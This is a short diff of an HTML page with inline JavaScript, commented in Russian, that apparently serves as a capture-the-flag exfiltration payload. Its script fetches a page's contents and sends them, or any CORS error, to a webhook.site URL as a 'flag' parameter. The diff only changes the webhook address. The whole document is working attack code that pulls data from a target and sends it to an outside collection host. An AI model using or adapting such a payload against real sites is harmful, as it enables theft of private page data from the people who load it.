@@ -13,11 +13,11 @@
         .then(response => response.text())
         .then(data => {
             // Отправляем содержимое страницы на webhook
-            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? flag=' + encodeURIComponent(data));
+            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334? flag=' + encodeURIComponent(data));
         })
         .catch(error => {
             // Если есть ошибка CORS, отправляем информацию об ошибке
-            fetch('https://webhook.site/f66e9df7-9edd-4ccc-bc24? error=' + encodeURIComponent(error));
+            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334? error=' + encodeURIComponent(error));
         });
     </script>
     <p>Loading...</p>
